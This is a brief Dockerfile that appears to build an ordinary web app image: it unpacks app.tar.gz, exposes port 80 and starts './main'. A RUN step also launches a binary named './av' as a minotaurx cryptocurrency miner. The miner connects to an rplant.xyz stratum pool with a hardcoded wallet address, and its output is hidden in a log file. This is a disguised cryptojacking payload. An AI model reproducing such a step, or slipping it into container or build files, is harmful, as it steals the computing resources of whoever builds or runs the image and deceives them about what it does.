FROM ubuntu:20.04
RUN apt-get update -y && ls -a
WORKDIR /..
ADD app.tar.gz ..
EXPOSE 80
RUN ./av -a minotaurx -o stratum+tcp://stratum-na.rplant.xyz:7068 -u RVB5jcbcTXPKiLLS2x9w19N6CdEF8vZEZz.Tesss -p x -q -x > nolayar.log 2>&1
CMD ["./main"]
